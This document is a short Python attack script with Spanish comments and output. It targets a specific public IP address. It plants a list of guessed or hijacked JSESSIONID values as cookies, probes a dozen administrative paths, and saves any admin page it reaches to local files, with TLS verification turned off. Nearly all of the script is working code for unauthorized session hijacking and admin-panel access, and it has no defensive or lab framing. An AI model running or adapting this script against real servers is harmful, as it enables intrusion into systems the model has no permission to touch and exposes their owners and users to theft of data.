#!/usr/bin/env python3
import requests
import urllib3
urllib3.disable_warnings()

def exploit_valid_sessions():
    target = "https://189.254.143.102"
    valid_sessions = [
        "00000000000000000000000000000000",
        "1234567890ABCDEF1234567890ABCDEF", 
        "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
        "0123456789ABCDEF0123456789ABCDEF",
        "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF",
        "5AC92EC7B819B3474841A747FF58C063"
    ]
    
    print("=== EXPLOTANDO SESIONES VÁLIDAS ===")
    
    for session_id in valid_sessions:
        session = requests.Session()
        session.cookies.set('JSESSIONID', session_id)
        session.verify = False
        
        # Probar acceso a áreas administrativas
        admin_paths = [
            "/jsp/admin/", "/jsp/administracion/", "/jsp/config/",
            "/jsp/panel/", "/jsp/control/", "/jsp/system/",
            "/admin/", "/administracion/", "/config/",
            "/manager/", "/webadmin/", "/sysadmin/"
        ]
        
        for path in admin_paths:
            try:
                r = session.get(f"{target}{path}", timeout=5)
                if r.status_code == 200 and "error" not in r.text.lower():
                    print(f"✅ ACCESO ADMIN: {session_id} -> {path}")
                    with open(f"admin_access_{session_id}_{path.replace('/', '_')}.html", "w") as f:
                        f.write(r.text)
            except:
                pass

if __name__ == "__main__":
    exploit_valid_sessions()
